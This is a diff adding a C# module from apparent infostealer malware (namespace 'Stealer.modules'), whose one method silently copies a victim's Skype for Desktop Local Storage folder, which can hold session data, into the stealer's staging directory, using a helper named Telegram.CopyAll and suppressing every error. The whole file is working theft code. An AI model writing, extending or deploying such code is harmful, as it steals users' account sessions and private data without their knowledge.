@@ -1,0 +1,25 @@
+﻿using System;
+using System.IO;
+
+namespace Stealer.modules
+{
+  internal class Skype
+  {
+    public static void GetSkype()
+    {
+      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Skype for Desktop\\Local Storage";
+      string str2 = Program.path + "\\Skype\\";
+      try
+      {
+        if (!Directory.Exists(str1))
+          return;
+        if (!Directory.Exists(str2))
+          Directory.CreateDirectory(str2);
+        Telegram.CopyAll(str1, str2);
+      }
+      catch
+      {
+      }
+    }
+  }
+}
